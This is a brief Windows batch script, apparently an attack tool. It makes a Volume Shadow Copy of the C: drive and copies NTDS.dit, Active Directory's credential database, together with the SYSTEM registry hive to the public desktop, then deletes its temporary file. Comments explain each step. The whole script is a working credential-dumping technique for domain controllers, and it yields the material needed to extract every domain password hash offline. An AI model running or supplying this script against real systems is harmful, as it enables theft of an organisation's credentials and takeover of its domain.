:: Creating the shadow partition and then passing the output into tmpFile
vssadmin create shadow /For=C: > tmpFile
@echo off
:: Saving the last line of tmpFile into containingLine variable.
FOR /F "tokens=*" %%g IN ('type tmpFile') do (SET containingLine=%%g)

:: Removing the string "Shadow Copy Volume Name: " from the variable leaving the shadow copy location
set containingLines=%containingLine:Shadow Copy Volume Name: =%

@echo on
:: Copies the new shadow partition NTDS.dit and SYSTEM key.
copy %containingLines%\Windows\NTDS\NTDS.dit c:\users\public\desktop\
copy %containingLines%\Windows\System32\config\SYSTEM c:\users\public\desktop\
@echo off
:: Cleaning up the output file.
del tmpFile
